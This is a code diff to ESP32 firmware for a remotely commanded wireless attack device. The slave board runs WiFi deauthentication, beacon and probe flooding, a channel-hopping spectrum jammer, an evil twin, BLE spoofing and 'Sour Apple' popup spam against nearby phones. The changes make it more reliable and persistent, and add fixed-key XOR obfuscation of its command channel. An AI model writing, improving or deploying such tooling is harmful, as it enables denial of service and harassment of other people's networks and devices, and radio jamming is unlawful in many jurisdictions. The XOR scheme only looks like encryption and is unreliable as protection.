@@ -9,9 +9,18 @@
 #include <BLEScan.h>
 #include <BLEAdvertisedDevice.h>
 #include <SPI.h>
+#include <Preferences.h>
 
 #define CC1101_CS 10
 #define IR_RX_PIN 4
+
+// ===== XOR CRYPT HELPER =====
+void XOR_crypt(uint8_t* data, size_t len) {
+  const uint8_t key[] = { 0xDE, 0xAD, 0xBE, 0xEF };
+  for (size_t i = 0; i < len; i++) {
+    data[i] ^= key[i % 4];
+  }
+}
 
 // ===== LED SETTINGS =====
 #define LED_PIN 8 
@@ -20,7 +29,7 @@
 typedef struct struct_message {
   char command[16];
   char attack[32];
-  char logMsg[128]; // Increased payload size
+  char logMsg[200]; // Fits ESP-NOW payload limit (max 250 bytes)
 } struct_message;
 struct_message myData;
 
@@ -119,9 +128,15 @@ void sendLogToMaster(const char* logMsg) {
   strncpy(response.logMsg, logMsg, sizeof(response.logMsg) - 1);
   response.logMsg[sizeof(response.logMsg) - 1] = '\0';
   
-  esp_err_t result = esp_now_send(masterMacAddress, (uint8_t *)&response, sizeof(response));
-  if (result != ESP_OK) {
-    Serial.printf("[ESP-NOW] Failed to send log to Master, err: %d\n", result);
+  XOR_crypt((uint8_t*)&response, sizeof(response)); // Encrypt
+  
+  for (int retry = 0; retry < 3; retry++) {
+    esp_err_t result = esp_now_send(masterMacAddress, (uint8_t *)&response, sizeof(response));
+    if (result == ESP_OK) {
+      break;
+    }
+    Serial.printf("[ESP-NOW] Failed to send log to Master (attempt %d/3), err: %d\n", retry + 1, result);
+    delay(5);
   }
 }
 
@@ -214,6 +229,7 @@ void runBeaconSpamStep(bool boost) {
       getRealisticSSID(ssidBuf, ssidIndex);
       sendRawBeacon(ssidBuf, currentChannel, ssidIndex);
       ssidIndex = (ssidIndex + 1) % 100;
+      yield();
     }
     
     if (random(10) == 0) {
@@ -295,6 +311,7 @@ void runDeauthStep(bool boost) {
       
       clientPacket[0] = 0xA0;
       esp_wifi_80211_tx(WIFI_IF_STA, clientPacket, sizeof(clientPacket), false);
+      yield();
     }
     
     if (random(80) == 0) {
@@ -359,8 +376,8 @@ void runProbeFloodStep() {
 void runPowerfulJammerStep() {
   esp_wifi_set_promiscuous(true);
   
-  // Hopping channels as fast as possible to flood spectrum
-  if (millis() - lastAttackActionTime >= 2) {
+  // Hopping channels as fast as possible to flood spectrum (throttled to 20ms to allow ESP-NOW)
+  if (millis() - lastAttackActionTime >= 20) {
     lastAttackActionTime = millis();
     hopChannel();
     
@@ -376,7 +393,6 @@ void runPowerfulJammerStep() {
   
   // Concurrent BLE advertisement spam to flood BLE band
   if (!bleJammerInitialized) {
-    BLEDevice::init("");
     BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
     BLEAdvertisementData data;
     data.setName("JAMMER");
@@ -565,18 +581,27 @@ void startWiFiScan() {
   
   // Hop through channels 1 to 13
   for (int ch = 1; ch <= 13; ch++) {
+    if (!attackRunning) break;
     currentChannel = ch;
     esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
     
     seenMacsCount = 0;
     memset(seenMacs, 0, sizeof(seenMacs));
     
-    delay(200); // Sniff for 200ms on this channel
+    // Sniff for 200ms on this channel (in 10ms steps to check attackRunning)
+    for (int step = 0; step < 20; step++) {
+      if (!attackRunning) break;
+      delay(10);
+      yield();
+    }
+    if (!attackRunning) break;
     
     int channelClients = countClientsForChannel(ch);
     
     // Report APs found on this channel
     for (int i = 0; i < apCount; i++) {
+      if (!attackRunning) break;
+      yield();
       if (apList[i].channel == ch) {
         char macStr[20];
         snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
@@ -594,6 +619,7 @@ void startWiFiScan() {
         delay(20);
       }
     }
+    yield();
   }
   
   // Unregister sniffer
@@ -649,8 +675,6 @@ void runEvilTwinStep() {
 
 void startBLEScan() {
   sendLogToMaster("[BLE] Starting BLE scan...");
-  BLEDevice::deinit();
-  BLEDevice::init("");
   BLEScan *pBLEScan = BLEDevice::getScan();
   pBLEScan->setActiveScan(true);
   pBLEScan->setInterval(100);
@@ -662,6 +686,7 @@ void startBLEScan() {
   sendLogToMaster(buf);
   
   for (int i = 0; i < min((int)foundDevices->getCount(), 15); i++) {
+    yield();
     BLEAdvertisedDevice device = foundDevices->getDevice(i);
     String devName = device.haveName() ? device.getName().c_str() : "Unnamed";
     String devAddr = device.getAddress().toString().c_str();
@@ -679,8 +704,6 @@ void startBLEScan() {
 
 void startBLESpoofer() {
   Serial.println("BLE Spoofer started");
-  BLEDevice::deinit();
-  BLEDevice::init("ESP32-S3");
   BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
   BLEAdvertisementData advertisementData;
   advertisementData.setName("BLE_Spoofer");
@@ -701,8 +724,6 @@ void startBLESpoofer() {
 void runBLEJammerStep() {
   if (!bleJammerInitialized) {
     Serial.println("BLE Jammer started");
-    BLEDevice::deinit();
-    BLEDevice::init("");
     BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
     BLEAdvertisementData data;
     data.setName("JAMMER");
@@ -718,8 +739,6 @@ void runBLEJammerStep() {
 void runSourAppleStep(bool boost) {
   if (!sourAppleInitialized) {
     Serial.println("BLE Spam started");
-    BLEDevice::deinit();
-    BLEDevice::init("Apple");
     sourAppleInitialized = true;
     lastAppleSpamTime = 0;
     sendLogToMaster("[BLE Spam] Starting popup spam (iOS, Android, Windows)");
@@ -764,6 +783,7 @@ void startGhzScan() {
   
   if (n > 0) {
     for (int i = 0; i < n; i++) {
+      yield();
       int ch = WiFi.channel(i);
       if (ch >= 1 && ch <= 13) {
         channelCount[ch]++;
@@ -774,8 +794,6 @@ void startGhzScan() {
   WiFi.scanDelete();
 
   // 2. Scan BLE devices
-  BLEDevice::deinit();
-  BLEDevice::init("");
   BLEScan *pBLEScan = BLEDevice::getScan();
   pBLEScan->setActiveScan(false);
   pBLEScan->setInterval(80);
@@ -1002,7 +1020,6 @@ void stopAttack() {
   if (BLEDevice::getAdvertising()) {
     BLEDevice::getAdvertising()->stop();
   }
-  BLEDevice::deinit();
   esp_wifi_set_promiscuous(false);
   restoreWiFiState();
   digitalWrite(LED_PIN, LOW);
@@ -1013,9 +1030,16 @@ void stopAttack() {
     strcpy(response.command, "stopped");
     strcpy(response.attack, "");
     strcpy(response.logMsg, "All attacks stopped. Standby mode.");
-    esp_err_t result = esp_now_send(masterMacAddress, (uint8_t *)&response, sizeof(response));
-    if (result != ESP_OK) {
-      Serial.printf("[ESP-NOW] Failed to send stopped confirmation, err: %d\n", result);
+    
+    XOR_crypt((uint8_t*)&response, sizeof(response)); // Encrypt
+    
+    for (int retry = 0; retry < 3; retry++) {
+      esp_err_t result = esp_now_send(masterMacAddress, (uint8_t *)&response, sizeof(response));
+      if (result == ESP_OK) {
+        break;
+      }
+      Serial.printf("[ESP-NOW] Failed to send stopped confirmation (attempt %d/3), err: %d\n", retry + 1, result);
+      delay(5);
     }
   }
   
@@ -1042,10 +1066,29 @@ void sendPong(const uint8_t *masterMac) {
   float sTemp = getBoardTemp();
   snprintf(response.logMsg, sizeof(response.logMsg), "%.1f", sTemp);
   
-  esp_err_t result = esp_now_send(masterMac, (uint8_t *)&response, sizeof(response));
-  if (result != ESP_OK) {
-    Serial.printf("[ESP-NOW] Failed to send pong to Master, err: %d\n", result);
+  XOR_crypt((uint8_t*)&response, sizeof(response)); // Encrypt
+  
+  for (int retry = 0; retry < 3; retry++) {
+    esp_err_t result = esp_now_send(masterMac, (uint8_t *)&response, sizeof(response));
+    if (result == ESP_OK) {
+      break;
+    }
+    Serial.printf("[ESP-NOW] Failed to send pong to Master (attempt %d/3), err: %d\n", retry + 1, result);
+    delay(5);
   }
+}
+
+void registerMasterPeer(const uint8_t *mac) {
+  esp_now_peer_info_t peer;
+  memset(&peer, 0, sizeof(peer));
+  memcpy(peer.peer_addr, mac, 6);
+  peer.channel = 1;
+  peer.encrypt = false;
+  
+  if (esp_now_is_peer_exist(mac)) {
+    esp_now_del_peer(mac);
+  }
+  esp_now_add_peer(&peer);
 }
 
 // ===== ESP-NOW HANDLER =====
@@ -1061,6 +1104,7 @@ void OnDataRecv(const uint8_t *mac_addr, const uint8_t *incomingData, int len) {
     return;
   }
   memcpy(&myData, incomingData, sizeof(myData));
+  XOR_crypt((uint8_t*)&myData, sizeof(myData)); // Decrypt
   myData.command[15] = '\0';
   myData.attack[31] = '\0';
 
@@ -1070,6 +1114,15 @@ void OnDataRecv(const uint8_t *mac_addr, const uint8_t *incomingData, int len) {
     hasMasterMac = true;
     Serial.printf("Master MAC registered: %02X:%02X:%02X:%02X:%02X:%02X\n",
                   srcMac[0], srcMac[1], srcMac[2], srcMac[3], srcMac[4], srcMac[5]);
+    
+    registerMasterPeer(srcMac); // Add Master as peer
+    
+    // Save to Preferences
+    Preferences prefs;
+    prefs.begin("esptool2", false);
+    prefs.putBytes("masterMac", masterMacAddress, 6);
+    prefs.putBool("hasMasterMac", true);
+    prefs.end();
   }
 
   lastMasterHeardTime = millis();
@@ -1120,11 +1173,36 @@ void setup() {
   esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
   esp_wifi_set_promiscuous(false);
 
+  // Initialize BLE stack once
+  BLEDevice::init("ESP32-S3");
+
+  // Check CC1101 connection
+  if (checkCC1101()) {
+    Serial.println("CC1101 found!");
+  } else {
+    Serial.println("CC1101 not found.");
+  }
+
   if (esp_now_init() != ESP_OK) {
     Serial.println("ESP-NOW init error");
     return;
   }
   esp_now_register_recv_cb((esp_now_recv_cb_t)OnDataRecv);
+  
+  // Load paired Master MAC from Preferences
+  Preferences prefs;
+  prefs.begin("esptool2", true);
+  if (prefs.getBool("hasMasterMac", false)) {
+    prefs.getBytes("masterMac", masterMacAddress, 6);
+    hasMasterMac = true;
+    Serial.printf("Loaded Master MAC from Flash: %02X:%02X:%02X:%02X:%02X:%02X\n",
+                  masterMacAddress[0], masterMacAddress[1], masterMacAddress[2], 
+                  masterMacAddress[3], masterMacAddress[4], masterMacAddress[5]);
+    
+    registerMasterPeer(masterMacAddress); // Register Master as peer
+  }
+  prefs.end();
+
   lastMasterHeardTime = millis();
   Serial.println("SLAVE ready for commands");
   Serial.print("My MAC: ");
@@ -1148,10 +1226,11 @@ void loop() {
       esp_wifi_set_promiscuous(false);
       esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
       
-      // Wait for 40ms on Channel 1 to receive incoming ESP-NOW command
+      // Wait for 500ms on Channel 1 to receive incoming ESP-NOW command
       unsigned long startListen = millis();
-      while (millis() - startListen < 40) {
+      while (millis() - startListen < 500) {
         delay(1); 
+        yield();
       }
       
       lastListenTime = millis();
